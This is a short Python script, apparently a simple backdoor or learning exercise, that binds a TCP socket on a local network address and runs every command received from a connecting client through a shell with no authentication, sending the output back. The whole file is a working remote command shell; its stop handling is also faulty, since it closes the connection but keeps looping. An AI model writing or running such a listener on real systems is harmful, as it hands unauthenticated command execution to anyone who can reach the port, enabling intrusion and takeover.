import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.1.122"
port = 12345

s.bind((host, port))
s.listen()
c, addr = s.accept()
while True:
        print (f"connection from {addr}")
        cmd = c.recv(1024).decode('utf-8')
        if cmd == "stop":
            c.close()
        prompt= subprocess.Popen([cmd], shell= True, stdout=subprocess.PIPE, stderr= subprocess.PIPE, text=False)
        stdout, stderr = prompt.communicate() 
        if stderr:
                rsp = stderr
        elif stdout:
                rsp = stdout  # Sinon, on envoie stdout
        else:
                rsp = b"No output from command" 
        rsp += b'\n'
        c.send(rsp) 
